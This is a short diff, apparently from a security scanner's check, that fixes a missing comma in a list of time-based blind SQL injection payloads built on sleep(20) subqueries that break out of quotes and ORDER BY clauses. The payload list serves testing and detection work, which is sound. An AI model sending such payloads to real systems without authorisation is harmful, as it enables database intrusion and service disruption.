@@ -30,8 +30,8 @@ source: |+
     "') AND (select(1)from(select(sleep(20)))a)-- z",
     "->test\"',(select(1)from(select(sleep(20)))a)-- z\"'",
     //"->test\"'))# (select(1)from(select(sleep(20)))a)-- z",
-    "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'"
-    "->test\"') XOR (select(1)from(select(sleep(20)))a)-- z\"'",
+    "->test\"' ASC, (select(1)from(select(sleep(20)))a)) DESC-- z\"'",
+    "->test\"') XOR (select(1)from(select(sleep(20)))a)-- z\"'"
   );
 
   var bypassCache = true;
